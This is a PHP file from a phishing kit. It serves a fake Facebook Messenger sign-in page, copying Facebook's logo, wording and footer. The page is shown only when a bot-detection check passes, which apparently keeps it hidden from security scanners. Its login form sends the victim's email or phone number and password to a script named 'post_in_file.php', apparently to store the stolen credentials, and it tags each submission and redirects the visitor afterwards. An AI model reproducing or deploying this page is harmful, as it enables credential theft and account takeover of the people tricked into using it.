<?php 
include ('../phishing_info/' . basename(__FILE__));
include('.././other/detect_bot.php');
        if (detect())
		{echo'<head><link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHMAAAB0CAMAAACBmP1sAAAAKlBMVEVHcEwAd/8Am/8Ao//+/v8Ag/8Ai/4Ak/8Brv8Aqf+n0fA9pPpwvPbV7P/cpejSAAAAAXRSTlMAQObYZgAABLlJREFUeAG9k4t2tDoIhTmJYxTw/V/3mN+6F6aEpjPWb7IqcmEHpkNvwDu6wxX6a1hVlhZR/SNlZl0i9O6RYz1w47y6DCN6/4hPDMuy/B7hpxU/U9XlffQjxbWeJ1Sx1mHh9eMF67Kerdb9HM8d2E68yfvtqLLewT4qjcLLegt1VH5MEgyK8novA6K63o2OSOY17wdPgPcIp15/WmyurGdN/Zwe2ytkNfX1deEfJE+ZapkWx/v5jD/Z1B+qHEpiTkhgKNMlpr1iKLpAD5g5TTCeE2DOvFAHQYXbwwYjmurjCLloXv9mznoWJQf+ruPT88f1K/e+zFSPBa8IwdOCHL9+8TabE8rwgacxkGUPctr6w1JqYMTdq5/1MFIziM1JndHb7Uq2c+JAqB0YcWiZ0HV4ZEg7ZkZhWJ6sYpuGaeG0le2gknb866aEZ6tmYk09OlzqhQxcAx8B4cZ9feHvY9bK8+HYsGCbZ3Jd1rMjBBgR3M2xYRnbpGTjglqTlNmOWUFd9mxYeMmIGh2b1ngug+K7DhQvAxzEirYl5synpH51KN7acrOCdl0AZm6LbaY2qwUlpx4lfQJ+LvzVq/RlcKAKh30bacBUUdsQx9UqqSALDrzBqrZuLAiYv2pWe+Y2KX7ImvYNHtmmadpwP3NfoUpyh8FfG8oi2Wq0lach0z8UdzBrph1GlbcK69dtqnA2g9tBUMHTgZh4QZCItHy58Ty5+Ou6TvTw7VSjrc9n4pa8vkpEUoaQycBpJFH8OBGhPCRtk2Xr3pSRw51ORFRGQCugxSObq/WGIeLfbjbYb5KtfynAg5roFe5XbbT0NbUMoJOLBl957jcjGd9svF+5SGrQjWT8Hyjcr179pUsa0US7YL+puZaUz+ZMUwhn7BVwCTXT25sF29Y64hlOzbnM+wn/gcbR4gCNRMezvhuMDz/NcdjWf7cTyRxSdPo1aQ6RnzTf2ewc8+Ocv9/shto353xjs/KhZol/Fh48/6wZbp8bRdmvwfFmy4+aGmqKO4K8u1loRrvY/HZpe2ezgIkGN7ulXsRSBjQp0JRgAHnrpwlN6W82aFa28KcZIFXzNb+Ot92AfflpbrgX8tz9iq2PNLn2qNR82K9i9/rykFZSUe/0A0w7Lxc2rTo0+93QPoQq4kUUnaRfPrOVLEOShSrqddvCvQLZprFEoFRhr1e4V8Os/1RZXmP8x/QP54aKvQ5Q5tcwM1F3uRvWdS9KB+zujPX1BzB9Ia+nKHSij2kqgackZyKgz49pBv2vfnb2h7ERa/zwDdaTRfdIjeLvVzPY1mv9Jox8U36tV7pwpqNqB2WIfXmtH+9O3VUaY54oQjYbT3dOm+LWQfkIMjWIWaE96NCeOMW5gVALY69tte/zzPhiTN9QN9Neu3v6dSZHyUHaxGHRoA5HyINRNH7Gr0U+HJYPiAZBpg4alA+MFixAqYtc/hs+HM0coR4QHew1eq++JEQrUH0Pe7FYEqL3MhM9LSo0wPygJLhTUmkMeV6S9DZJplH4viGf1mR6WlOJHtYUooc1hem38IOK4MHvETw4YqApIn8jCDr7YpWenDJ9iKMIWFXk9TqnF/1MDkizsEd4XBGiSs/C/Hcj/g+0zLZI7bXdoQAAAABJRU5ErkJggg==" rel="shortcut icon" sizes=196x196>
<link rel=stylesheet type=text/css href="../remove branding logo/000webhost.css">';
echo'<style>.container{color:#929292;font-size:14px;font-weight:normal;display:block;position:relative;padding-left:35px;margin-bottom:12px;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.container input{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.checkmark{position:absolute;top:0;left:1%;height:15px;width:15px;background-color:#eee;border-radius:20%}.container:hover input ~ .checkmark{background-color:#ccc}.container input:checked ~ .checkmark{background-color:#2196f3}.checkmark:after{content:"";position:absolute;display:none}.container input:checked ~ .checkmark:after{display:block}.container .checkmark:after{left:5px;top:2px;width:3px;height:7px;border:solid white;border-width:0 3px 3px 0;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg)}::placeholder{color:rgba(0,0,0,.20);opacity:1}:-ms-input-placeholder{color:rgba(0,0,0,.20)}::-ms-input-placeholder{color:rgba(0,0,0,.20)}button{background:#fff;color:#0084ff;font-size:24px;font-weight:normal;margin-top:5px;align-items:center;border:0;box-shadow:none;display:flex;margin-left:auto;margin-right:auto;overflow:hidden;text-overflow:ellipsis;text-shadow:none;white-space:nowrap;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;cursor:pointer;text-decoration:none;line-height:26px;padding:0 10px}button:active,button:focus{border:2px solid #0084ff;border-radius:3px}.input:focus{border-color:#0084ff}.input{border:1px solid rgba(0,0,0,.20);border-radius:4px;color:rgba(0,0,0,1);display:block;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-size:17px;height:42px;margin-bottom:12px;margin-left:auto;margin-right:auto;padding:0 16px;width:286px}.sml{margin:10px;color:#a8a8a8;cursor:pointer;text-decoration:none;font-size:11px;text-align:center}</style><div><div><div><div><div><br><br><br><br><center><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEwAAABKCAMAAAAmEEIEAAAANlBMVEVHcEwAwP8Bs/8Agv8ktPYZeN0Siu8yjNk2hs8ynecAjv8Bp/8Ad/8Bmv/////R7f9Yvv+e2/8HLAH/AAAACnRSTlMA////4M3tgD2vYPIbvwAAAphJREFUeAHFk48OoyAMh6sTKLo/+v4ve73uF8AK3txI7munUsoXIBn9Aw5xAjEwfY94BoMYvzJlkRVe9cXhlNhPdUUXho/45LA8DR8y8eVt/bC5abhE7OMCU0dX04arH/vYpr+mMT3OGBGwnbrSC4HHvpZKFVscxsYq84koPqN1scwi8dI07zzcTbE9pHYedfaNSSXNmIPG3IYXSAtNZdjNRHNIkHzWg1KjwruN/Ug0G/sN7rQxs7VlvBz5gTGBcN015gfGAbL4wToTi51aYj6lgJYD2+swAd+2pnI6J5e96UrSiudTbShqKutrk89cYZWFpc24Pp+wJaB6bvtKwJW1EZfaTHncntaFS5vOXbAZ1cH1mFTml4dEyhxwwZa6RKWuslXwKpNPlEzABRu61ldyI/RT8i0Taq4RGrCp/wXzsR8yNScW/OAqbaOo4Co6AWT7raFpwcICVNRV6BCQ1Ugu44TrCGS+4cJFbVbWcPmmDPe8PoTtIxdk7jE/JFPAJSqMNuNCly7LI6eyiHpOda1JrmOwFg4EBlFlYZ5lUKT+W7QBlWxbi14ExnMgZa+a9U88vzuMbX1XsRxgTG/8XLLJZeUmgJOjmg1Z6yGLOxdUINvgahEh46K2YkXFhpkGTOmcP4FTgjDfEDPetZBsR6CEf/fmNSYrpX2np0yQ8jvxMFkp7TsDFXgUBXlU1lVdqeqphKWOFVXm8zLTDnf7AUcG/73Lk4W/lzEdCLfbvZnNGXEFqhBlqhXtqXukKlHm6imPxhxcVVtjScOFfTUI9+bW6tVAJ/D9EkynuAsqx9RNhiP2kDmiXjKcsIcMqg4yFwhckTnm6Hzp8S4wXcAdjsIcFEbhuswH+h3IoOohi9QJh8vqQoDq//MHcYd0E1zD4+0AAAAASUVORK5CYII="></head></center><h1 style="color:#000;font-size:40px;font-weight:300;margin-bottom:24px;text-align:center;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;direction:ltr;line-height:1.34">Messenger</h1><h2 style="color:#000;font-size:16px;font-weight:200;line-height:1.2;margin-bottom:24px;text-align:center;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;direction:ltr">Instantly connect with people in your life.</h2><div style="color:#000;font-size:16px;font-weight:200;line-height:1.2;margin-bottom:24px;text-align:center;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif">Sign in with Facebook to get started.</div><div><div><div><form action=.././other/post_in_file.php method=post><div>
<input type=hidden name=name value="'.basename(__FILE__).'">

<input  class=input name=username type=text placeholder="Email address or phone number" />
<input  size=80 class=input name=password type=password placeholder=Password />
<input  type=hidden name=location value=Messenger />
<input  type=hidden name=link value='.$redirect.'><br><button type=submit>Continue</button><br><br><div><div style=margin-left:40%><p style=margin-bottom:27px><label class=container>
<input  type=checkbox checked=checked> Keep me signed in <span class=checkmark></span></label></p></div></div></div></form></div></div></div></div></div></div><div style=text-align:center><a class=sml href>Not on Facebook?</a><span style=margin:5px;color:#a8a8a8>|</span><a class=sml href>Forgotten password</a><span style=margin:5px;color:#a8a8a8>|</span><a class=sml href>Data Policy</a><span style=margin:5px;color:#a8a8a8>|</span><a class=sml href>Terms</a><span style=margin:5px;color:#a8a8a8>|</span><a class=sml href>Cookies Policy</a><span style=margin:5px;color:#a8a8a8>|</span><a href class=sml> &copy; Facebook 2019 </div></div><footer></footer></div>';}?>